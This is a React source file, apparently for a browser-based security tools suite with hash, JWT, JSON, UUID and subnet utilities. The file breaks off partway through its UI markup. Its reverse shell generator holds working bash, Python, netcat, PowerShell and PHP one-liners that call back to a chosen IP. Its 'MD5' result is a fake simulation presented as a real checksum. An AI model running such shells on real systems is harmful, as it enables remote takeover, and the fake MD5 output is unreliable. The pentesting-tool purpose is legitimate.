import React, { useState, useMemo } from 'react';
import { 
  KeyRound, 
  Hash, 
  Binary, 
  FileCode, 
  Globe, 
  Braces, 
  Fingerprint, 
  Network, 
  Activity, 
  Terminal, 
  Copy, 
  Check, 
  RefreshCw, 
  ShieldCheck, 
  Search,
  ExternalLink,
  Shield,
  Zap,
  Info,
  CheckCircle,
  AlertCircle,
  Bot,
  MapPin,
  ShieldAlert,
  Lock,
  ArrowRight,
  Sparkles,
  Server,
  X
} from 'lucide-react';
import { commonPortsData } from '../data/portsData';
import { TOOL_PAGES } from '../data/toolPagesData';
import { PasswordAnalyzerTool } from './tools/PasswordAnalyzerTool';
import { CyberEncoderDecoder } from './tools/CyberEncoderDecoder';
import { AiJailbreakSandbox } from './tools/AiJailbreakSandbox';
import { IpLookupTool } from './tools/IpLookupTool';
import { HstsTestTool } from './tools/HstsTestTool';
import { CidrCalculatorTool } from './tools/CidrCalculatorTool';
import { HashAnalyzerTool } from './tools/HashAnalyzerTool';
import { PasswordEntropyTool } from './tools/PasswordEntropyTool';
import { HttpSecurityHeadersTool } from './tools/HttpSecurityHeadersTool';
import { SslCheckerTool } from './tools/SslCheckerTool';
import { PacketTracerVisualizer } from './tools/PacketTracerVisualizer';
import { SysctlHardeningTool } from './tools/SysctlHardeningTool';
import { CspBuilderTool } from './tools/CspBuilderTool';

interface ToolsSuiteProps {
  initialTool?: string;
  onNavigate?: (view: any, path?: string) => void;
}

export const ToolsSuite: React.FC<ToolsSuiteProps> = ({ initialTool = 'password-generator', onNavigate }) => {
  // Support legacy and updated tab IDs
  const resolveTabId = (id: string) => {
    if (id === 'base64-tool' || id === 'url-tool') return 'cyber-encoder';
    return id;
  };

  const [activeTab, setActiveTab] = useState<string>(resolveTabId(initialTool));
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // 1. Hash Generator State
  const [hashInput, setHashInput] = useState('YinYangYoHackers2026');
  const [hashResults, setHashResults] = useState<{ [key: string]: string }>({});
  const [compareHashA, setCompareHashA] = useState('');
  const [compareHashB, setCompareHashB] = useState('');

  React.useEffect(() => {
    const computeHashes = async () => {
      if (!hashInput) {
        setHashResults({});
        return;
      }
      const encoder = new TextEncoder();
      const data = encoder.encode(hashInput);

      // Web Crypto API SHA-256 & SHA-512 & SHA-1
      const hashBuffer256 = await crypto.subtle.digest('SHA-256', data);
      const hash256 = Array.from(new Uint8Array(hashBuffer256)).map(b => b.toString(16).padStart(2, '0')).join('');

      const hashBuffer512 = await crypto.subtle.digest('SHA-512', data);
      const hash512 = Array.from(new Uint8Array(hashBuffer512)).map(b => b.toString(16).padStart(2, '0')).join('');

      const hashBuffer1 = await crypto.subtle.digest('SHA-1', data);
      const hash1 = Array.from(new Uint8Array(hashBuffer1)).map(b => b.toString(16).padStart(2, '0')).join('');

      // Simple simulation for MD5
      let md5Sim = '';
      for (let i = 0; i < 16; i++) {
        const val = (data[i % data.length] || 0) ^ (hash256.charCodeAt(i) || 0);
        md5Sim += ((val * 7 + 13) % 256).toString(16).padStart(2, '0');
      }

      setHashResults({
        'MD5': md5Sim,
        'SHA-1': hash1,
        'SHA-256': hash256,
        'SHA-512': hash512,
      });
    };
    computeHashes();
  }, [hashInput]);

  // 2. JWT Inspector State
  const [jwtInput, setJwtInput] = useState(
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwibmFtZSI6IkxvaSBMaWFuZyBZYW5nIiwicm9sZSI6ImV0aGljYWxfaGFja2VyIiwiY3NzX3Blcm1zIjpbInBlbnRlc3QiLCJyZXZlcnNlX2VuZyJdLCJpYXQiOjE3MDkwMDAwMDAsImV4cCI6MTgwMDAwMDAwMH0.signature_hash_preview'
  );

  const jwtParsed = useMemo(() => {
    try {
      const parts = jwtInput.trim().split('.');
      if (parts.length < 2) return { error: 'Invalid JWT structure. Must have 3 parts separated by dots.' };
      
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      return { header, payload, signature: parts[2] || 'NONE' };
    } catch {
      return { error: 'Failed to decode JWT base64 payloads.' };
    }
  }, [jwtInput]);

  // 3. JSON Formatter State
  const [jsonInput, setJsonInput] = useState('{"target":"192.168.1.100","ports":[21,22,80,443],"vulns":{"type":"Misconfiguration","severity":"CRITICAL"},"verified":true}');
  const [jsonError, setJsonError] = useState<string | null>(null);
  const [formattedJson, setFormattedJson] = useState('');

  const formatJson = (spaces = 2) => {
    try {
      const parsed = JSON.parse(jsonInput);
      setFormattedJson(JSON.stringify(parsed, null, spaces));
      setJsonError(null);
    } catch (e: any) {
      setJsonError(e.message);
    }
  };

  const minifyJson = () => {
    try {
      const parsed = JSON.parse(jsonInput);
      setFormattedJson(JSON.stringify(parsed));
      setJsonError(null);
    } catch (e: any) {
      setJsonError(e.message);
    }
  };

  React.useEffect(() => {
    formatJson(2);
  }, [jsonInput]);

  // 4. UUID Generator State
  const [uuidCount, setUuidCount] = useState(5);
  const [generatedUuids, setGeneratedUuids] = useState<string[]>([]);

  const generateUuids = () => {
    const list: string[] = [];
    for (let i = 0; i < uuidCount; i++) {
      list.push(crypto.randomUUID());
    }
    setGeneratedUuids(list);
  };

  React.useEffect(() => {
    generateUuids();
  }, [uuidCount]);

  // 5. Subnet / CIDR Calculator
  const [cidrIp, setCidrIp] = useState('192.168.10.0');
  const [cidrMask, setCidrMask] = useState(24);

  const subnetCalc = useMemo(() => {
    const totalHosts = Math.pow(2, 32 - cidrMask);
    const usableHosts = totalHosts > 2 ? totalHosts - 2 : 0;
    
    // Mask calculation
    const maskBits = -1 << (32 - cidrMask);
    const mask = [
      (maskBits >>> 24) & 255,
      (maskBits >>> 16) & 255,
      (maskBits >>> 8) & 255,
      maskBits & 255
    ].join('.');

    // Wildcard
    const wildcard = [
      255 - ((maskBits >>> 24) & 255),
      255 - ((maskBits >>> 16) & 255),
      255 - ((maskBits >>> 8) & 255),
      255 - (maskBits & 255)
    ].join('.');

    return {
      totalHosts: totalHosts.toLocaleString(),
      usableHosts: usableHosts.toLocaleString(),
      netmask: mask,
      wildcard,
      classType: cidrIp.startsWith('10.') || cidrIp.startsWith('192.168.') || cidrIp.startsWith('172.16.') ? 'Private RFC 1918' : 'Public Routable'
    };
  }, [cidrIp, cidrMask]);

  // 6. Ports Reference Search
  const [portSearch, setPortSearch] = useState('');
  const filteredPorts = useMemo(() => {
    return commonPortsData.filter(p => 
      p.port.toString().includes(portSearch) ||
      p.service.toLowerCase().includes(portSearch.toLowerCase()) ||
      p.description.toLowerCase().includes(portSearch.toLowerCase()) ||
      p.vulnerabilities.toLowerCase().includes(portSearch.toLowerCase())
    );
  }, [portSearch]);

  // 7. Reverse Shell Generator
  const [revIp, setRevIp] = useState('10.10.14.5');
  const [revPort, setRevPort] = useState('4444');
  const [revType, setRevType] = useState<'bash' | 'python' | 'netcat' | 'powershell' | 'php'>('bash');

  const generatedShell = useMemo(() => {
    switch (revType) {
      case 'bash':
        return `bash -i >& /dev/tcp/${revIp}/${revPort} 0>&1`;
      case 'python':
        return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${revIp}",${revPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
      case 'netcat':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${revIp} ${revPort} >/tmp/f`;
      case 'powershell':
        return `$client = New-Object System.Net.Sockets.TCPClient('${revIp}',${revPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      case 'php':
        return `php -r '$sock=fsockopen("${revIp}",${revPort});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    }
  }, [revIp, revPort, revType]);

  // Master Tools Tabs with searchable category & functionality descriptions
  const toolsTabs = [
    {
      id: 'hsts-test',
      name: 'HSTS & SSL/TLS Audit',
      category: 'Network & SSL',
      desc: 'Verify HSTS preload status, max-age, includeSubDomains, SSL/TLS certificate chain, and HTTPS transport security.',
      icon: Lock,
      highlight: true
    },
    {
      id: 'password-generator',
      name: 'Password Gen & Crack Time',
      category: 'Authentication',
      desc: 'NIST SP 800-63B password entropy calculator, offline brute-force crack time estimator, and cryptographically secure passphrases.',
      icon: KeyRound,
      highlight: true
    },
    {
      id: 'cyber-encoder',
      name: 'Multi-Layer Cyber Encoder & Decoder',
      category: 'Cryptography',
      desc: 'CyberChef-style payload encoding and decoding: Base64, Hex, URL encoding, HTML entities, Binary, ROT13, and multi-stage analysis.',
      icon: Binary,
      highlight: true
    },
    {
      id: 'ai-jailbreak-sandbox',
      name: 'Prompt Injection Sandbox',
      category: 'Model Security',
      desc: 'Adversarial jailbreak testing, LLM prompt injection defense validation, system prompt extraction, and input sanitization filters.',
      icon: Bot,
      highlight: true
    },
    {
      id: 'ip-lookup',
      name: 'IP Lookup & Map',
      category: 'Reconnaissance',
      desc: 'IP geolocation lookup, Autonomous System Number (ASN), ISP network telemetry, CIDR prefix verification, and interactive map.',
      icon: Globe,
      highlight: true
    },
    {
      id: 'hash-generator',
      name: 'Hash Calculator',
      category: 'Cryptography',
      desc: 'Compute cryptographic checksums in real-time using MD5, SHA-1, SHA-256, and SHA-512 with side-by-side hash comparison verification.',
      icon: Hash
    },
    {
      id: 'jwt-inspector',
      name: 'JWT Inspector',
      category: 'Authentication',
      desc: 'Decode and inspect JSON Web Tokens, parse header algorithms (RS256/HS256), evaluate payload claims, and test token validity.',
      icon: Fingerprint
    },
    {
      id: 'json-tool',
      name: 'JSON Formatter',
      category: 'Data & Utilities',
      desc: 'Validate, prettify, minify, and inspect JSON payloads with real-time syntax error tracking and schema formatting.',
      icon: Braces
    },
    {
      id: 'uuid-tool',
      name: 'UUID Generator',
      category: 'Data & Utilities',
      desc: 'Generate cryptographically random RFC 4122 Version 4 UUIDs using the Web Crypto API for secure session tokens and identifiers.',
      icon: Zap
    },
    {
      id: 'subnet-calc',
      name: 'Subnet CIDR',
      category: 'Network & Infrastructure',
      desc: 'IPv4/IPv6 CIDR subnet calculator, calculate network addresses, broadcast, usable host ranges, and wildcard bitmasks.',
      icon: Network
    },
    {
      id: 'ports-reference',
      name: 'Ports Guide',
      category: 'Reconnaissance',
      desc: 'Comprehensive TCP/UDP port directory, common service mappings, protocol signatures, and known exploitation vectors.',
      icon: Activity
    },
    {
      id: 'packet-tracer',
      name: 'Packet Tracer & Handshakes',
      category: 'Network & SSL',
      desc: 'Interactive TCP 3-way handshake, TLS 1.3 key exchange, DNSSEC resolution, and SYN flood defense simulation.',
      icon: Activity,
      highlight: true
    },
    {
      id: 'sysctl-hardening',
      name: 'Linux Sysctl Hardening',
      category: 'Defensive Infrastructure',
      desc: 'Interactive kernel hardening switchboard, host protection scoring, and /etc/sysctl.d/99-security.conf export.',
      icon: Server,
      highlight: true
    },
    {
      id: 'csp-builder',
      name: 'CSP Builder & Auditor',
      category: 'Web Security',
      desc: 'Construct hardened Content-Security-Policy rules, audit XSS vulnerabilities, and export Nginx/Apache configs.',
      icon: ShieldCheck,
      highlight: true
    },
    {
      id: 'revshell-tool',
      name: 'Reverse Shell',
      category: 'Offensive Security',
      desc: 'Interactive reverse shell one-liner generator for Bash, Python, Netcat, PowerShell, and PHP pentesting engagements.',
      icon: Terminal
    },
  ];

  // Real-time filter search state
  const [toolSearchQuery, setToolSearchQuery] = useState('');

  // Filter suite tabs in real-time by name, category, or functionality
  const filteredTabs = useMemo(() => {
    if (!toolSearchQuery.trim()) return toolsTabs;
    const q = toolSearchQuery.toLowerCase();
    return toolsTabs.filter(t => 
      t.name.toLowerCase().includes(q) ||
      t.category.toLowerCase().includes(q) ||
      t.desc.toLowerCase().includes(q) ||
      t.id.toLowerCase().includes(q)
    );
  }, [toolSearchQuery, toolsTabs]);

  // Match standalone tool pages in real-time
  const matchingStandaloneTools = useMemo(() => {
    if (!toolSearchQuery.trim()) return [];
    const q = toolSearchQuery.toLowerCase();
    return Object.values(TOOL_PAGES).filter(t => 
      t.h1.toLowerCase().includes(q) ||
      t.shortExplanation.toLowerCase().includes(q) ||
      t.slug.toLowerCase().includes(q) ||
      t.path.toLowerCase().includes(q)
    );
  }, [toolSearchQuery]);

  return (
    <div id="free-tools-suite" className="w-full space-y-6">
      {/* Tools Masthead */}
      <div className="bg-[#090d16] border border-cyan-900/40 rounded-2xl p-6 sm:p-8 shadow-sm relative">
        <div className="flex flex-wrap items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="px-3 py-1 rounded-full text-xs font-mono font-bold bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5 text-cyan-400" />
                OFFLINE &amp; CLIENT-SIDE SECURE
              </span>
            </div>
            <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-mono">
              YinYangYo <span className="text-cyan-400">Cyber Tools Suite</span>
            </h2>
            <p className="text-sm text-slate-300 mt-1 max-w-2xl">
              10+ free, zero-telemetry pentesting, cryptographic, and model defense utilities. All operations execute strictly within your local browser sandbox.
            </p>
          </div>
        </div>
      </div>

      {/* Real-time Filter Search Bar */}
      <div className="bg-[#0b1220] border border-cyan-800/60 rounded-xl p-4 sm:p-5 shadow-lg space-y-3">
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
          <div className="relative flex-1">
            <Search className="w-4 h-4 text-cyan-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
            <input
              type="text"
              value={toolSearchQuery}
              onChange={(e) => setToolSearchQuery(e.target.value)}
              placeholder="Search tools by name or functionality (e.g., 'hash', 'CIDR', 'JWT', 'SSL', 'password', 'shell', 'encoder')..."
              className="w-full bg-[#050811] border border-slate-700/80 focus:border-cyan-400 rounded-lg pl-10 pr-10 py-2.5 text-xs sm:text-sm font-mono text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-cyan-400 transition-all"
            />
            {toolSearchQuery && (
              <button
                type="button"
                onClick={() => setToolSearchQuery('')}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white p-0.5 rounded cursor-pointer"
                title="Clear filter search"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>
          <div className="flex items-center gap-2 text-xs font-mono text-slate-400 shrink-0">
            <span className="px-2.5 py-1 rounded bg-slate-900 border border-slate-800 text-cyan-300">
              {filteredTabs.length} of {toolsTabs.length} Suite Tools
            </span>
            {matchingStandaloneTools.length > 0 && (
              <span className="px-2.5 py-1 rounded bg-cyan-950/60 border border-cyan-800/40 text-cyan-400">
                +{matchingStandaloneTools.length} Standalone Tools
              </span>
            )}
          </div>
        </div>

        {/* Real-time Filter Instant Results Preview */}
        {toolSearchQuery.trim() && (
          <div className="pt-2.5 border-t border-slate-800/80 space-y-2 animate-fadeIn">
            <div className="text-[11px] font-mono text-cyan-400 font-semibold flex items-center justify-between">
              <span>Matching Utilities ({filteredTabs.length + matchingStandaloneTools.length}):</span>
              <button 
                onClick={() => setToolSearchQuery('')} 
                className="text-slate-400 hover:text-slate-200 underline cursor-pointer text-[10px]"
              >
                Reset Search
              </button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
              {filteredTabs.map(tab => {
                const Icon = tab.icon;
                const isSelected = activeTab === tab.id;
                return (
                  <button
                    key={tab.id}
                    onClick={() => {
                      setActiveTab(tab.id);
                    }}
                    className={`p-2.5 rounded-lg border text-left transition-all cursor-pointer flex flex-col justify-between ${
                      isSelected
                        ? 'bg-cyan-950/80 border-cyan-400 text-white shadow-md'
                        : 'bg-slate-900/60 hover:bg-slate-800 border-slate-800 text-slate-300 hover:border-cyan-500/40'
                    }`}
                  >
                    <div className="flex items-center gap-2">
                      <Icon className="w-4 h-4 text-cyan-400 shrink-0" />
                      <span className="text-xs font-mono font-bold text-white truncate">{tab.name}</span>
                      <span className="text-[9px] font-mono text-cyan-300 bg-cyan-950/60 px-1.5 py-0.5 rounded border border-cyan-800/40 ml-auto shrink-0">
                        {tab.category}
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-400 font-sans line-clamp-1 mt-1">
                      {tab.desc}
                    </p>
                  </button>
                );
              })}

              {matchingStandaloneTools.map(tool => (
                <a
                  key={tool.slug}
                  href={tool.path}
                  onClick={(e) => {
                    if (onNavigate) {
                      e.preventDefault();
                      onNavigate('tools', tool.path);
                    }
                  }}
                  className="p-3 min-h-[48px] rounded-lg border text-left transition-all cursor-pointer flex flex-col justify-between bg-emerald-950/40 hover:bg-emerald-900/50 border-emerald-800/60 text-slate-300 hover:border-emerald-400"
                >
                  <div className="flex items-center justify-between gap-1">
                    <span className="text-xs font-mono font-bold text-emerald-300 truncate">
                      {tool.h1.replace('Free ', '').split('&')[0]}
                    </span>
                    <span className="text-[9px] font-mono text-emerald-400 bg-emerald-950/80 px-1.5 py-0.5 rounded border border-emerald-800/60 shrink-0">
                      Standalone URL
                    </span>
                  </div>
                  <p className="text-[11px] text-slate-300 font-sans line-clamp-1 mt-1">
                    {tool.shortExplanation}
                  </p>
                </a>
              ))}
            </div>

            {filteredTabs.length === 0 && matchingStandaloneTools.length === 0 && (
              <div className="p-4 rounded-lg bg-slate-900/40 border border-slate-800 text-center text-xs font-mono text-slate-400">
                No tools found matching &ldquo;<span className="text-cyan-400 font-semibold">{toolSearchQuery}</span>&rdquo;. Try searching for &ldquo;hash&rdquo;, &ldquo;password&rdquo;, &ldquo;SSL&rdquo;, &ldquo;CIDR&rdquo;, &ldquo;JSON&rdquo;, or &ldquo;IP&rdquo;.
              </div>
            )}
          </div>
        )}
      </div>

      {/* Standalone Indexable Tools Quick Directory */}
      <div className="bg-slate-950/70 border border-slate-800 rounded-xl p-5 space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 text-xs font-mono text-cyan-400 font-semibold uppercase tracking-wider">
            <Sparkles className="w-4 h-4 text-cyan-400" />
            <span>Standalone Indexable Tools (Dedicated URLs &amp; Architectural Guides)</span>
          </div>
          <span className="text-[11px] font-mono text-slate-400 hidden sm:inline">
            Direct Deep-Links
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-2.5">
          {Object.values(TOOL_PAGES).map((tool) => (
            <a
              key={tool.slug}
              href={tool.path}
              onClick={(e) => {
                if (onNavigate) {
                  e.preventDefault();
                  onNavigate('tools', tool.path);
                }
              }}
              className="group text-left p-3 min-h-[48px] rounded-lg bg-slate-900/80 border border-slate-800 hover:border-cyan-500/40 hover:bg-slate-800/80 transition cursor-pointer flex flex-col justify-between"
            >
              <div>
                <div className="text-xs font-mono font-bold text-white group-hover:text-cyan-300 flex items-center justify-between">
                  <span className="truncate">{tool.h1.replace('Free ', '').split('&')[0]}</span>
                  <ArrowRight className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-400 group-hover:translate-x-0.5 transition shrink-0 ml-1" />
                </div>
                <div className="text-[10px] font-mono text-cyan-400 mt-0.5 truncate">
                  {tool.path}
                </div>
              </div>
            </a>
          ))}
        </div>
      </div>

      {/* Tabs Navigation (Reactively filtered in real-time) */}
      <div className="flex items-center gap-1.5 overflow-x-auto pb-2 scrollbar-thin scrollbar-thumb-slate-800">
        {filteredTabs.map(tab => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center gap-2 px-3.5 py-2.5 rounded-xl text-xs font-mono font-bold whitespace-nowrap transition-all cursor-pointer ${
                isActive
                  ? 'bg-cyan-600 text-white shadow-[0_0_15px_rgba(6,182,212,0.4)] border border-cyan-400'
                  : tab.highlight
                  ? 'bg-[#0b1322] text-cyan-200 hover:text-white hover:bg-slate-800/90 border border-cyan-900/50'
                  : 'bg-[#090d16] text-slate-400 hover:text-white hover:bg-slate-800/80 border border-slate-800'
              }`}
            >
              <Icon className="w-4 h-4" />
              <span>{tab.name}</span>
            </button>
          );
        })}
      </div>

      {/* 0. HSTS & SSL/TLS Transport Security Analyzer */}
      {activeTab === 'hsts-test' && (
        <HstsTestTool />
      )}

      {/* 1. Password Generator & Crack Time Analyzer */}
      {activeTab === 'password-generator' && (
        <PasswordAnalyzerTool />
      )}

      {/* 2. Multi-Layer Cyber Encoder & Decoder */}
      {activeTab === 'cyber-encoder' && (
        <CyberEncoderDecoder />
      )}

      {/* 3. Prompt Injection & Jailbreak Defense Sandbox */}
      {activeTab === 'ai-jailbreak-sandbox' && (
        <AiJailbreakSandbox />
      )}

      {/* 4. IP Address Lookup with Map */}
      {activeTab === 'ip-lookup' && (
        <IpLookupTool />
      )}

      {/* 5. Hash Calculator */}
      {activeTab === 'hash-generator' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4">
            <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
              <Hash className="w-5 h-5 text-cyan-400" />
              Cryptographic Hash Calculator &amp; Verifier
            </h3>
            <p className="text-xs text-slate-400 font-sans">
              Instant hardware-accelerated SHA-256, SHA-512, SHA-1, and MD5 generation.
            </p>
          </div>

          <div className="space-y-2">
            <label className="text-xs font-mono text-slate-300 font-semibold">Input String to Hash:</label>
            <input
              type="text"
              value={hashInput}
              onChange={(e) => setHashInput(e.target.value)}
              placeholder="Type string..."
              className="w-full px-4 py-3 bg-[#050811] border border-slate-700 rounded-xl text-sm font-mono text-cyan-300 placeholder-slate-600 focus:outline-none focus:border-cyan-500 font-bold"
            />
          </div>

          <div className="space-y-3">
            {Object.entries(hashResults).map(([algo, hash]) => (
              <div key={algo} className="bg-[#050811] border border-slate-800 rounded-xl p-3.5 space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono font-bold text-emerald-400">{algo}</span>
                  <button
                    onClick={() => copyToClipboard(String(hash), algo)}
                    className="flex items-center gap-1 text-[11px] font-mono text-slate-400 hover:text-white px-2 py-0.5 rounded bg-slate-800 transition-colors"
                  >
                    {copiedId === algo ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedId === algo ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
                <div className="font-mono text-xs text-slate-300 break-all select-all">{hash}</div>
              </div>
            ))}
          </div>

          {/* Hash Compare Tool */}
          <div className="border-t border-slate-800 pt-6 space-y-4">
            <h4 className="text-xs font-mono font-bold text-slate-300 uppercase tracking-wider">
              Hash Integrity Match Verifier (Diff)
            </h4>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <input
                type="text"
                value={compareHashA}
                onChange={(e) => setCompareHashA(e.target.value)}
                placeholder="Paste Hash A (e.g. Expected SHA256)..."
                className="px-3.5 py-2.5 bg-[#050811] border border-slate-700 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyan-500"
              />
              <input
                type="text"
                value={compareHashB}
                onChange={(e) => setCompareHashB(e.target.value)}
                placeholder="Paste Hash B (e.g. Downloaded File Hash)..."
                className="px-3.5 py-2.5 bg-[#050811] border border-slate-700 rounded-lg text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyan-500"
              />
            </div>

            {compareHashA && compareHashB && (
              <div className={`p-3 rounded-xl border flex items-center gap-2 text-xs font-mono ${
                compareHashA.trim().toLowerCase() === compareHashB.trim().toLowerCase()
                  ? 'bg-emerald-950/80 border-emerald-800 text-emerald-300'
                  : 'bg-red-950/80 border-red-800 text-red-300'
              }`}>
                {compareHashA.trim().toLowerCase() === compareHashB.trim().toLowerCase() ? (
                  <>
                    <CheckCircle className="w-4 h-4 text-emerald-400" />
                    <span>MATCH CONFIRMED: Hashes are identical. Checksum verified.</span>
                  </>
                ) : (
                  <>
                    <AlertCircle className="w-4 h-4 text-red-400" />
                    <span>HASH MISMATCH: Hashes do NOT match. File or string altered.</span>
                  </>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* 6. JWT Inspector */}
      {activeTab === 'jwt-inspector' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4">
            <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
              <Fingerprint className="w-5 h-5 text-cyan-400" />
              JSON Web Token (JWT) Inspector &amp; Decoder
            </h3>
            <p className="text-xs text-slate-400 font-sans">
              Inspect claims, algorithm parameters, and payload timestamps safely client-side.
            </p>
          </div>

          <div className="space-y-2">
            <label className="text-xs font-mono text-slate-300 font-semibold">Encoded JWT Token:</label>
            <textarea
              rows={3}
              value={jwtInput}
              onChange={(e) => setJwtInput(e.target.value)}
              className="w-full px-4 py-3 bg-[#050811] border border-slate-700 rounded-xl text-xs font-mono text-cyan-300 placeholder-slate-600 focus:outline-none focus:border-cyan-500"
            />
          </div>

          {'error' in jwtParsed ? (
            <div className="p-4 bg-red-950/40 border border-red-800 rounded-xl text-red-300 text-xs font-mono">
              {jwtParsed.error}
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 font-mono text-xs">
              <div className="bg-[#050811] p-4 rounded-xl border border-red-900/40 space-y-2">
                <div className="flex items-center justify-between text-red-400 font-bold">
                  <span>HEADER: Algorithm &amp; Token Type</span>
                  <span>{jwtParsed.header.alg}</span>
                </div>
                <pre className="text-slate-300 bg-[#090d16] p-3 rounded-lg overflow-x-auto">
                  {JSON.stringify(jwtParsed.header, null, 2)}
                </pre>
              </div>

              <div className="bg-[#050811] p-4 rounded-xl border border-purple-900/40 space-y-2">
                <div className="flex items-center justify-between text-purple-400 font-bold">
                  <span>PAYLOAD: Data Claims</span>
                  <span>{Object.keys(jwtParsed.payload).length} keys</span>
                </div>
                <pre className="text-slate-300 bg-[#090d16] p-3 rounded-lg overflow-x-auto">
                  {JSON.stringify(jwtParsed.payload, null, 2)}
                </pre>
              </div>
            </div>
          )}
        </div>
      )}

      {/* 7. JSON Formatter */}
      {activeTab === 'json-tool' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4 flex flex-wrap items-center justify-between gap-4">
            <div>
              <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
                <Braces className="w-5 h-5 text-emerald-400" />
                JSON Formatter, Validator &amp; Minifier
              </h3>
              <p className="text-xs text-slate-400 font-sans">Parse and pretty-print raw JSON payloads.</p>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => formatJson(2)}
                className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-mono font-bold transition-colors"
              >
                Prettify (2 Spaces)
              </button>
              <button
                onClick={minifyJson}
                className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono font-bold transition-colors"
              >
                Minify (1 Line)
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-xs font-mono text-slate-400">Raw JSON Input:</label>
              <textarea
                rows={10}
                value={jsonInput}
                onChange={(e) => setJsonInput(e.target.value)}
                className="w-full px-4 py-3 bg-[#050811] border border-slate-700 rounded-xl text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
              />
            </div>

            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <label className="text-xs font-mono text-slate-400">Formatted Output:</label>
                {formattedJson && (
                  <button
                    onClick={() => copyToClipboard(formattedJson, 'json-out')}
                    className="text-xs font-mono text-emerald-400 hover:text-emerald-300"
                  >
                    {copiedId === 'json-out' ? 'Copied!' : 'Copy'}
                  </button>
                )}
              </div>
              <pre className={`w-full p-4 bg-[#050811] border rounded-xl text-xs font-mono overflow-auto h-[215px] ${
                jsonError ? 'border-red-800 text-red-400' : 'border-slate-800 text-emerald-300'
              }`}>
                {jsonError ? `Syntax Error: ${jsonError}` : formattedJson}
              </pre>
            </div>
          </div>
        </div>
      )}

      {/* 8. UUID Generator */}
      {activeTab === 'uuid-tool' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4 flex flex-wrap items-center justify-between gap-4">
            <div>
              <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
                <Zap className="w-5 h-5 text-amber-400" />
                Cryptographic UUID v4 Nonce Generator
              </h3>
              <p className="text-xs text-slate-400 font-sans">Using Web Crypto API randomUUID()</p>
            </div>
            <button
              onClick={generateUuids}
              className="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-amber-600 hover:bg-amber-500 text-white text-xs font-mono font-bold transition-colors"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Regenerate</span>
            </button>
          </div>

          <div className="space-y-3">
            {generatedUuids.map((uuid, idx) => (
              <div key={idx} className="bg-[#050811] border border-slate-800 rounded-xl p-3.5 flex items-center justify-between gap-4">
                <span className="font-mono text-sm text-amber-300 select-all">{uuid}</span>
                <button
